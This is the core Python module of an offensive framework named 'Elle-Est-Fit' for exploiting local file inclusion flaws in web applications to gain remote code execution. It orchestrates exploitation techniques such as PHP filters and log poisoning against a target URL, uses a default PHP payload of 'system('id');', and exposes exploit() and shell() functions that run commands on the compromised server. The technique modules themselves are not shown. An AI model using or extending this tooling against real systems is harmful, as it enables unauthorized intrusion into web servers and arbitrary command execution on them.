"""
Core functionality for the Elle-Est-Fit framework.
"""

import logging
import importlib
import inspect
import typing as t
from urllib.parse import urlparse

from .exceptions import ElleEstFitError, TechniqueError, ValidationError
from .techniques.base import TechniqueBase
from .utils.validation import validate_url

# Configure logging
logger = logging.getLogger("elle-est-fit")


def info(message: str) -> None:
    """Display information message."""
    logger.info(message)


class LFI:
    """
    Main class for LFI exploitation.
    
    This class handles the discovery and exploitation of LFI vulnerabilities
    to achieve remote code execution using various techniques.
    """
    
    def __init__(
        self, 
        target: str = None,
        leak_function: t.Callable[[str], str] = None,
        technique: str = None,
        double_url_encode: bool = False,
        tamper: t.Callable[[str], str] = None,
        php_code: str = None,
        custom_cmd: str = None,
        verbose: bool = False
    ):
        """
        Initialize LFI exploitation framework.
        
        Args:
            target: Target URL with LFI vulnerability (e.g., http://target.com/page.php?file=)
            leak_function: Custom function that takes a filename and returns its contents
            technique: Specific technique to use (if None, will try all available)
            double_url_encode: Whether to apply double URL encoding
            tamper: Custom function to modify the LFI parameter
            php_code: Custom PHP code to execute instead of default shells
            custom_cmd: Custom command to execute on successful RCE
            verbose: Enable verbose output
        """
        self.target = target
        self.leak_function = leak_function
        self.technique_name = technique
        self.double_url_encode = double_url_encode
        self.tamper = tamper
        self.php_code = php_code or "system('id');"
        self.custom_cmd = custom_cmd
        self.verbose = verbose
        self.shell_path = None
        self._technique = None
        
        # Set up logging
        log_level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        # Validate inputs
        self._validate_inputs()
        
        # Initialize technique if specified
        if self.technique_name:
            self._init_technique()
    
    def _validate_inputs(self):
        """Validate input parameters."""
        if not self.target and not self.leak_function:
            raise ValidationError("Either target URL or leak_function must be provided")
        
        if self.target:
            validate_url(self.target)
    
    def _init_technique(self):
        """Initialize the specified exploitation technique."""
        try:
            # Dynamically import the technique module
            technique_module = importlib.import_module(
                f".techniques.{self.technique_name.lower()}", 
                package="elle_est_fit"
            )
            
            # Find the technique class (should be the only class that inherits from TechniqueBase)
            for name, obj in inspect.getmembers(technique_module):
                if (inspect.isclass(obj) and 
                    issubclass(obj, TechniqueBase) and 
                    obj != TechniqueBase):
                    self._technique = obj(
                        target=self.target,
                        leak_function=self.leak_function,
                        double_url_encode=self.double_url_encode,
                        tamper=self.tamper,
                        php_code=self.php_code
                    )
                    break
            
            if not self._technique:
                raise TechniqueError(f"Technique '{self.technique_name}' not found")
                
        except (ImportError, AttributeError) as e:
            raise TechniqueError(f"Failed to load technique '{self.technique_name}': {str(e)}")
    
    def discover_techniques(self):
        """
        Attempt to discover which LFI to RCE techniques might work.
        
        Returns:
            List of technique names that might be viable
        """
        # This would try various techniques to see which ones might work
        # For now, we'll return a placeholder
        return ["php_filters", "log_poisoning"]
    
    def exploit(self):
        """
        Attempt to exploit the LFI vulnerability to achieve RCE.
        
        Returns:
            True if successful, False otherwise
        """
        if not self._technique:
            # If no technique was specified, try to find one that works
            viable_techniques = self.discover_techniques()
            for technique_name in viable_techniques:
                self.technique_name = technique_name
                try:
                    self._init_technique()
                    if self._technique.check():
                        info(f"Technique '{technique_name}' appears viable, attempting exploitation")
                        result = self._technique.exploit()
                        if result:
                            self.shell_path = self._technique.shell_path
                            return True
                except TechniqueError as e:
                    logger.debug(f"Technique '{technique_name}' failed: {str(e)}")
            
            logger.error("All exploitation techniques failed")
            return False
        else:
            # If a specific technique was requested, use only that one
            if self._technique.check():
                result = self._technique.exploit()
                if result:
                    self.shell_path = self._technique.shell_path
                    return True
            return False
    
    def shell(self, command: str = None):
        """
        Execute commands via the established RCE shell.
        
        Args:
            command: Command to execute (if None, will use self.custom_cmd or start an interactive shell)
            
        Returns:
            Command output
        """
        if not self.shell_path:
            if not self.exploit():
                raise ElleEstFitError("Failed to establish a shell. Run exploit() first.")
        
        cmd = command or self.custom_cmd or "id"
        return self._technique.execute(cmd)


# Convenience functions
def exploit(
    target: str = None,
    leak_function: t.Callable[[str], str] = None,
    technique: str = None,
    double_url_encode: bool = False,
    tamper: t.Callable[[str], str] = None,
    php_code: str = None,
    custom_cmd: str = None,
    verbose: bool = False
):
    """
    Quick exploitation function.
    
    Args:
        See LFI class for parameter descriptions
        
    Returns:
        LFI instance with established shell if successful
    """
    lfi = LFI(
        target=target,
        leak_function=leak_function,
        technique=technique,
        double_url_encode=double_url_encode,
        tamper=tamper,
        php_code=php_code,
        custom_cmd=custom_cmd,
        verbose=verbose
    )
    
    if lfi.exploit():
        info(f"Exploitation successful. Shell established at {lfi.shell_path}")
        return lfi
    else:
        info("Exploitation failed.")
        return None


def shell(
    target: str = None,
    leak_function: t.Callable[[str], str] = None,
    technique: str = None,
    command: str = "id",
    **kwargs
):
    """
    Quick shell execution function.
    
    Args:
        target: Target URL
        leak_function: Custom function that leaks file contents
        technique: Technique to use
        command: Command to execute
        **kwargs: Additional parameters for LFI class
        
    Returns:
        Command output if successful, None otherwise
    """
    lfi_instance = exploit(
        target=target,
        leak_function=leak_function,
        technique=technique,
        **kwargs
    )
    
    if lfi_instance:
        return lfi_instance.shell(command)
    return None
